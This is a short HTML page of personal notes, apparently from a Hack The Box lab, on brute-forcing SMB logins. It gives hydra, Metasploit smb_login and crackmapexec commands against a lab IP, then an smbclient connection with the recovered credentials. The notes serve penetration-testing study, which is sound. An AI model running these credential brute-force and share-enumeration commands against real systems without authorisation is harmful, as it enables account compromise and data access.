<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>smb</title>
</head><body>Sambe/SMB<br/>
Brute Force credentials:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197</li>
</ul>
Possible Erros:<ul><li style="list-style-type: none">[ERROR] invalid reply from target smb://10.129.42.197:445/</li>
</ul>
Fix:?<br/>
Is cause we can't handle SMBv3 replies and need to update / recompile hydra or use msfconsole.<br/>
<br/>
Msfconsole brute force SMB<ul><li style="list-style-type: none">msf6 &gt; use auxiliary/scanner/smb/smb_login</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Obviously in options set username lsit and password list for brute forcing.</li>
</ul>
</li>
</ul>
Using Crackmap:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares</li>
</ul>
<br/>
Once we have credentials we can communicate with the server using smbclient:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME</li>
</ul>
</body></html>